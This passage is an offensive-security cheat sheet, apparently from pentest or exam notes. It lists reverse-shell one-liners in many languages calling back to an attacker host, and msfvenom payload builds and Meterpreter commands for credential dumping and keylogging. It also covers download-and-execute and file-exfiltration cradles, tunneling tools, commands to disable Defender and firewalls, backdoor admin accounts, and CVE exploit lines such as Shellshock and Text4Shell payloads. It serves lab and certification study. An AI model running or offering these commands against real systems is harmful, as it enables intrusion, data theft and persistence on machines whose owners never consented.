+/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1&quot;
+
+system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1&#x27;&quot;);
+
+system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1&#x27;&quot;);
+
+bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1
+
+busybox nc &lt;LHOST&gt; 4444 -e bash
+
+# Python3
+python3 -c &#x27;import socket,subprocess,os;s=socket.socket();s.connect((&quot;&lt;LHOST&gt;&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;
+
+# Netcat (mkfifo)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f
+
+# PHP
+php -r &#x27;$sock=fsockopen(&quot;&lt;LHOST&gt;&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;
+
+# PowerShell
+$client = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;LHOST&gt;&#x27;,4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1 | Out-String );$sendback2=$sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+# PowerShell Base64 encoded (generate at revshells.com)
+powershell -e &lt;BASE64_PAYLOAD&gt;
+
+# Perl
+perl -e &#x27;use Socket;$i=&quot;&lt;LHOST&gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#x27;
+
+# Ruby
+ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;&lt;LHOST&gt;&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;
+
+# Java
+r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt;LHOST&gt;/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+
+# Groovy (Jenkins)
+String host=&quot;&lt;LHOST&gt;&quot;; int port=4444; String cmd=&quot;/bin/bash&quot;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+# Text4Shell exploit
+curl &#x27;http://192.168.162.150:8080/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec(&quot;busybox nc 192.168.45.187 4444 -e sh&quot;)}%&#x27;
+
+# Xterm
+xterm -display &lt;LHOST&gt;:1
+# Attacker: Xnest :1; xhost +targetip</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80a7-aeff-fc2f8dc981d4" class="">Listeners</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80fa-84bd-d29a2b6bfbf3" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">rlwrap nc -lvnp 4444          # Best for Linux (adds history/arrows)
+nc -lvnp 4444                 # Basic
+socat file:`tty`,raw,echo=0 TCP-LISTEN:4444    # Full TTY listener</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-800b-93b3-f70067a6e3ab" class="">Shell Upgrade (TTY)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8088-8108-f1ee209f47af" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Method 1: Python PTY
+python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;
+
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+export SHELL=bash
+
+terminal type ? screen
+# Method 2: Script
+script -q /dev/null -c bash
+# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+
+bash -i 
+
+bash -p 
+
+
+# Method 3: Socat (best)
+# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Victim: socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:4444</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80aa-9149-ca4ed7e6288c" class="">msfvenom Payloads</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8001-ad57-fa3526a951c9" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># List payloads
+msfvenom -l payloads | grep windows
+msfvenom -l payloads | grep linux
+
+# Linux bind
+msfvenom -p linux/x64/shell/bind_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f elf -o shell.elf
+
+# Linux ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f exe -o shell.exe
+
+# Windows Encoded
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -e x86/shikata_ga_nai -i 9 -f exe -o encoded.exe
+
+# ASPX
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f aspx -o shell.aspx
+
+# JSP WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f war -o shell.war
+
+# PHP
+msfvenom -p php/reverse_php LHOST=&lt;LHOST&gt; LPORT=4444 -f raw &gt; shell.php
+
+# MSI (AlwaysInstallElevated)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f msi -o shell.msi
+
+# DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f dll -o shell.dll
+
+# cmd/powershell reverse (task.bat)
+msfvenom -p cmd/windows/reverse_powershell LHOST=&lt;LHOST&gt; LPORT=4444 -o task.bat
+
+# cmd add Windows EXE
+msfvenom -a x86 --platform Windows -p windows/exec CMD=&#x27;net localgroup administrators username /add&#x27; -f exe &gt; payload.exe
+
+msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=&#x27;net localgroup administrators username /add&#x27; -f exe -o payload.exe</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8030-ba91-e727f0ec8ae0" class="">Metasploit Handler</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-803d-a8ab-ca35cc76f0e6" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">msf6 &gt; use exploit/multi/handler
+msf6 &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf6 &gt; set LHOST &lt;LHOST&gt;
+msf6 &gt; set LPORT 4444
+msf6 &gt; exploit
+
+msf6 &gt; search &lt;keyword&gt;
+
+# Meterpreter commands
+meterpreter &gt; getuid
+meterpreter &gt; getsystem
+meterpreter &gt; sysinfo
+meterpreter &gt; ps
+meterpreter &gt; migrate &lt;PID&gt;
+meterpreter &gt; shell
+meterpreter &gt; background
+meterpreter &gt; load kiwi
+meterpreter &gt; creds_all
+meterpreter &gt; hashdump
+meterpreter &gt; search -f &lt;FILE&gt;
+meterpreter &gt; upload &lt;FILE&gt;
+meterpreter &gt; download &lt;FILE&gt;
+meterpreter &gt; portfwd add -l &lt;LPORT&gt; -p &lt;RPORT&gt; -r 127.0.0.1
+meterpreter &gt; run post/windows/gather/checkvm
+meterpreter &gt; run post/multi/recon/local_exploit_suggester
+meterpreter &gt; run post/windows/manage/enable_rdp
+meterpreter &gt; keyscan_start
+meterpreter &gt; keyscan_dump</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-8039-a462-edc9c47e685b"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-807a-b588-e1df20ecd154" class="">📁 File Transfers</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80e8-a7d2-e0ef1e875795" class="">HTTP Server (Attacker)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-803c-8cf7-d6d0cdfe08fc" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Python
+python3 -m http.server 80
+python2 -m SimpleHTTPServer 80
+
+# PHP
+php -S 0.0.0.0:8888
+
+# Ruby
+ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&quot;
+
+# on kali , upload server
+wget https://github.com/boboaung1337/again/raw/refs/heads/main/upload_server.py
+
+python3 upload_server.py
+
+# on victim
+powershell -c &quot;Invoke-WebRequest -Uri http://10.10.15.169/hMailServer.sdf -Method PUT -InFile &#x27;C:\ProgramData\hMailServer.sdf&#x27;&quot;
+
+curl -X PUT -T &quot;hMailServer.sdf&quot; http://192.168.1.100/hMailServer.sdf</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8037-ade6-e88384dceae3" class="">Download - Linux Target</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8082-9951-c130a1e7e6bb" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wget http://&lt;LHOST&gt;/file
+curl -O http://&lt;LHOST&gt;/file
+curl -s http://&lt;LHOST&gt;/file -o file
+
+
+# Receiver (target)
+nc -lvnp 4444 &gt; file
+
+# Sender (Kali)
+nc TARGET 4444 &lt; file
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8028-aeea-dbca31d0e6c5" class="">Download - Windows Target</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8068-bd1f-e97098557ca7" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Certutil
+certutil -urlcache -split -f http://&lt;LHOST&gt;/file.exe file.exe
+
+# PowerShell
+powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://&lt;LHOST&gt;/file.exe&#x27;, &#x27;C:\Temp\file.exe&#x27;)&quot;
+powershell -c &quot;Invoke-WebRequest -Uri http://&lt;LHOST&gt;/file.exe -OutFile file.exe&quot;
+IEX(New-Object Net.WebClient).DownloadString(&#x27;http://&lt;LHOST&gt;/script.ps1&#x27;)
+
+# BITS
+bitsadmin /transfer job /download /priority normal http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
+
+# Windows - Download
+iwr -uri http://&lt;LHOST&gt;/shell.exe -outfile shell.exe
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-803b-b1c8-ff897a9e2153" class="">SMB Server (Impacket)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-807c-a41a-efcbc6207178" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Attacker
+sudo impacket-smbserver share ./ -smb2support -username user -password pass
+
+# Windows
+net use Z: \\&lt;LHOST&gt;\share /user:user pass
+copy Z:\file.exe C:\Temp\</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80be-b686-f4c05776fc43" class="">Base64 Encoding</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80a9-9e3f-eed2f715cedd" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Linux
+base64 -w0 file &gt; file.b64
+echo &quot;&lt;BASE64&gt;&quot; | base64 -d &gt; file
+
+# Windows (PowerShell)
+[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(&quot;C:\file.txt&quot;))
+
+# Decode on attacker
+echo &#x27;&lt;BASE64&gt;&#x27; | base64 -d &gt; file.txt
+
+# PowerShell from browser
+echo IEX(New-Object System.Net.WebClient).downloadString(&#x27;http://&lt;LHOST&gt;/script.ps1&#x27;) | powershell -noprofile -ep bypass</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8096-817e-fbd9807e60dc" class="">FTP</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8095-9ebe-ec8ff113da61" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Target
+ftp &lt;IP&gt;
+# Login: anonymous / (blank)
+
+# Automated FTP download
+echo open &lt;LHOST&gt; 21 &gt; ftp.txt
+echo user&gt;&gt; ftp.txt
+echo pass&gt;&gt; ftp.txt
+echo bin&gt;&gt; ftp.txt
+echo GET evil.exe &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+ftp -s:ftp.txt</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80e0-b7b3-ec13b67ff160" class="">VBScript Download</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80e5-af79-f599096ad2db" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Create wget.vbs
+echo &quot;Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)&quot; &gt; wget.vbs
+echo &quot;Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)&quot; &gt;&gt; wget.vbs
+echo &quot;objXMLHTTP.open &quot;GET&quot;, WScript.Arguments(0), False&quot; &gt;&gt; wget.vbs
+echo &quot;objXMLHTTP.send&quot; &gt;&gt; wget.vbs
+echo &quot;If objXMLHTTP.Status = 200 Then&quot; &gt;&gt; wget.vbs
+echo &quot;objADOStream.Type = 1&quot; &gt;&gt; wget.vbs
+echo &quot;objADOStream.Open&quot; &gt;&gt; wget.vbs
+echo &quot;objADOStream.Write objXMLHTTP.ResponseBody&quot; &gt;&gt; wget.vbs
+echo &quot;objADOStream.SaveToFile WScript.Arguments(1)&quot; &gt;&gt; wget.vbs
+echo &quot;objADOStream.Close&quot; &gt;&gt; wget.vbs
+echo &quot;End If&quot; &gt;&gt; wget.vbs
+
+# Target
+cscript wget.vbs http://&lt;LHOST&gt;/file.exe file.exe</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-806e-891e-f8f8b9f3ac9f"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-804f-8648-e2d0c9f23ef6" class="">🔌 Pivoting &amp; Tunneling</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8090-911c-e3994f14eab6" class="">Ligolo-ng (Recommended)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8031-8476-f64a78cc538d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Download agent linx/windows
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz &amp;&amp; tar -xvf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz &amp;&amp; rm -rf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz LICENSE README.md
+
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_windows_amd64.zip &amp;&amp; unzip ligolo-ng_agent_0.8.3_windows_amd64.zip &amp;&amp; rm -rf ligolo-ng_agent_0.8.3_windows_amd64.zip LICENSE README.md
+
+
+# Attacker - create TUN + start proxy
+sudo apt install ligolo-ng
+
+sudo ligolo-proxy -selfcert
+
+sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443 
+
+# Target - connect agent
+./agent.exe -connect &lt;LHOST&gt;:11601 -ignore-cert
+./agent -connect &lt;LHOST&gt;:11601 -ignore-cert
+
+# In proxy console
+session
+1
+interface_create --name ligolo
+tunnel_start --tun ligolo
+ifconfig
+route_add --name ligolo --route &lt;SUBNET&gt;/24
+
+# Double pivot - expose ligolo port via listener
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+./agent.exe -connect &lt;MS01_IP&gt;:11601 -ignore-cert
+
+# Ligolo listener for reverse shell
+listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999 --tcp</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8003-a75d-c76857b44f3e" class="">Chisel</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-800d-8e65-cb80c8d24024" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Attacker (server)
+./chisel server -p 8000 --reverse
+
+# Target - SOCKS5 proxy
+./chisel client &lt;LHOST&gt;:8000 R:socks
+
+# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn &lt;internal_IP&gt;
+
+# Target - specific port forward
+./chisel client &lt;LHOST&gt;:8000 R:8080:127.0.0.1:8080</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80f5-ad6a-c5ab0043d169" class="">SSH Tunneling</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80a0-a90c-fecaf50538b1" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Local port forward
+ssh -L 8080:internal_host:80 user@&lt;jumphost&gt;
+ssh -L 3389:10.10.10.50:3389 user@&lt;jumphost&gt;
+
+# Remote port forward
+ssh -R 8080:localhost:80 user@&lt;LHOST&gt;
+ssh -R 8081:172.24.0.2:80 user@&lt;LHOST&gt;
+
+# Dynamic SOCKS
+ssh -D 1080 user@&lt;jumphost&gt;
+
+# SSHuttle
+sshuttle -r user@&lt;jumphost&gt; &lt;SUBNET&gt;/24</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-808f-8dac-c9f9abfe0bc3" class="">Plink (Windows)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80bc-9de8-f8abed4927ad" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Download
+certutil -urlcache -split -f http://&lt;LHOST&gt;/plink.exe plink.exe
+
+# Remote port forward
+plink.exe &lt;LHOST&gt; -P 22 -C -N -R 4455:127.0.0.1:445 -l &lt;USER&gt; -pw &lt;PASS&gt;
+
+# Dynamic SOCKS
+plink.exe &lt;LHOST&gt; -P 22 -C -N -D 1080 -l &lt;USER&gt; -pw &lt;PASS&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-807f-8634-c8d9bcc2f792" class="">Netsh (Windows)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8012-83a8-c1e6d55a82aa" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Port forward
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+
+# Firewall rule
+netsh advfirewall firewall add rule name=&quot;port_forward_ssh_2222&quot; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+
+# Delete
+netsh advfirewall firewall delete rule name=&quot;port_forward_ssh_2222&quot;
+
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8007-837a-eeb40a45fec1" class="">Socat Port Forwarding</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-804c-8955-f897ce46c14e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+socat tcp-listen:5986,reuseaddr,fork tcp:&lt;RHOST&gt;:9002</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-802c-a6ef-cec18a099b7f" class="">Proxychains</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-802d-9ccd-e2a64bbc06d7" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+# Usage
+proxychains nmap -sT -Pn -p 445,3389,5985 &lt;internal_IP&gt;
+proxychains rdesktop &lt;internal_IP&gt;
+proxychains ssh user@&lt;internal_IP&gt;</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-80e4-9e5d-fa7104954395"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8079-9162-ecb9802203ec" class="">🔧 Post-Exploitation</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8097-b7e6-ca4fc951a0da" class="">Windows - Disable Defender &amp; Firewall</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8028-9279-c2a60cec018e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Disable Windows Firewall
+netsh advfirewall set allprofiles state off
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# Disable Windows Defender
+powershell -Command &quot;Set-MpPreference -DisableRealtimeMonitoring $true&quot;
+Set-MpPreference -DisableRealTimeMonitoring $true
+
+# Add AV exclusion
+Add-MpPreference -ExclusionPath &quot;C:\Windows\Temp&quot;
+
+# Enable RDP
+reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall set rule group=&quot;remote desktop&quot; new enable=Yes
+
+net localgroup &quot;Remote Desktop Users&quot; &lt;USER&gt; /add</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-807f-b272-c39ecf4cb574" class="">Windows - Add User / Persistence</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8019-8e67-fd041c31478c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">net user hacker Password123! /add
+net localgroup Administrators hacker /add
+net localgroup &quot;Remote Desktop Users&quot; hacker /add</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8047-ab7f-c66e85246ae8" class="">Linux - Add User</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-802c-b3d0-d4bb82677be6" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">echo &#x27;&lt;USER&gt;:&lt;PASSWORD&gt;&#x27; | chpasswd
+useradd -m &lt;USER&gt;
+echo &#x27;&lt;USER&gt;:&lt;PASSWORD&gt;&#x27; | chpasswd</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8089-ae66-cd08cdfda22c" class="">RDP with Drive Mount</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80f7-a4b5-fe05db9637c4" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">xfreerdp3 /v:&lt;IP&gt; /u:&lt;USER&gt; /p:&#x27;&lt;PASSWORD&gt;&#x27; /cert:ignore +clipboard /dynamic-resolution /drive:.,share
+
+xfreerdp /v:&lt;IP&gt; /u:&lt;USER&gt; /p:&#x27;&lt;PASSWORD&gt;&#x27; /dynamic-resolution +clipboard
+
+xfreerdp /v:&lt;IP&gt; /u:&lt;USER&gt; /d:&lt;DOMAIN&gt; /pth:&#x27;&lt;HASH&gt;&#x27; /dynamic-resolution +clipboard
+
+reminna , rdesktop</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-807f-8a8b-f64846c4c0e1" class="">PowerShell Remoting</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80a6-9fe7-d0f68c741110" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Enter session
+$SecurePassword = ConvertTo-SecureString &#x27;&lt;PASSWORD&gt;&#x27; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#x27;&lt;USERNAME&gt;&#x27;, $SecurePassword)
+$Session = New-PSSession -Credential $Cred
+Enter-PSSession $Session
+Invoke-Command -Session $session -scriptblock { whoami }
+
+# Download and execute
+$bytes = (Invoke-WebRequest &quot;http://&lt;LHOST&gt;/file.exe&quot; -UseBasicParsing ).Content
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq &#x27;Program&#x27; }, &#x27;First&#x27;).GetMethod(&#x27;Main&#x27;)
+$entryPointMethod.Invoke($null, (, [string[]] (&#x27;&#x27;)))</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-8086-80c7-f889459aedfd"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-80c7-8531-c277d6725ce4" class="">🎯 Common CVEs &amp; Exploits</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8083-a6da-c553c9aecd24" class="">SearchSploit</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80c4-a3f5-f4e41445cd6e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">searchsploit &lt;software&gt; &lt;version&gt;
+searchsploit &quot;windows smb&quot; remote
+searchsploit -w openssh 7.2      # Show Exploit-DB URL
+searchsploit -m 47837            # Copy exploit to CWD
+searchsploit -x 47837            # Examine without copying
+searchsploit -u                  # Update DB</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80cd-a319-cd1b5ad0054f" class="">CVE List</h3></div><div style="display:contents" dir="ltr"><table id="384a083f-29df-80e1-a117-d078fe59c289" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8067-8a98-d8419dc18402"><th id="Ihe:" class="simple-table-header-color simple-table-header">CVE</th><th id="LsT_" class="simple-table-header-color simple-table-header">Target</th><th id="^bZz" class="simple-table-header-color simple-table-header">Impact</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8034-a58b-ef7de07eff59"><td id="Ihe:" class="">MS17-010 (EternalBlue)</td><td id="LsT_" class="">Win7/2008 R2 (SMB v1)</td><td id="^bZz" class="">→ SYSTEM</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-80a7-9e5f-c60acece1f1d"><td id="Ihe:" class="">CVE-2019-0708 (BlueKeep)</td><td id="LsT_" class="">Win7/2008 RDP</td><td id="^bZz" class="">→ RCE/SYSTEM</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8075-89e3-fb1dde29fbf3"><td id="Ihe:" class="">CVE-2021-41773</td><td id="LsT_" class="">Apache 2.4.49 PATH traversal</td><td id="^bZz" class="">→ RCE</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8033-a431-da58406ef30b"><td id="Ihe:" class="">CVE-2021-3156 (Baron Samedit)</td><td id="LsT_" class="">sudo &lt; 1.9.5p2</td><td id="^bZz" class="">→ local root</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8044-bcd9-e260a3a23de5"><td id="Ihe:" class="">CVE-2021-4034 (PwnKit)</td><td id="LsT_" class="">pkexec all distros</td><td id="^bZz" class="">→ local root</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-809d-9121-f5fe2c622d14"><td id="Ihe:" class="">CVE-2022-0847 (DirtyPipe)</td><td id="LsT_" class="">kernel 5.8–5.16.11</td><td id="^bZz" class="">→ local root</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8006-af76-da5d9cbdc813"><td id="Ihe:" class="">CVE-2016-5195 (DirtyCow)</td><td id="LsT_" class="">kernel &lt; 4.8.3</td><td id="^bZz" class="">→ local root</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8039-854e-fa1e2922c53d"><td id="Ihe:" class="">CVE-2021-44228 (Log4Shell)</td><td id="LsT_" class="">Log4j 2.x Java</td><td id="^bZz" class="">→ RCE</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8091-829c-c6a9080b801d"><td id="Ihe:" class="">CVE-2021-1675 (PrintNightmare)</td><td id="LsT_" class="">Win2019/10</td><td id="^bZz" class="">→ SYSTEM/RCE</td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8018-a60a-cd1b28af7023"><td id="Ihe:" class="">CVE-2020-1472 (ZeroLogon)</td><td id="LsT_" class="">Domain Controller</td><td id="^bZz" class="">→ AD Compromise</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-806e-99ad-e5811995329a" class="">CVE Exploit Commands</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8016-b515-e6ce8d4b1f9e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># CVE-2014-6271: Shellshock
+curl -H &#x27;Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27; http://&lt;RHOST&gt;
+
+# CVE-2019-14287: Sudo Bypass
+sudo -u#-1 /bin/bash
+
+# CVE-2021-3156: Sudo Baron Samedit
+sudoedit -s /
+
+# CVE-2021-44228: Log4Shell
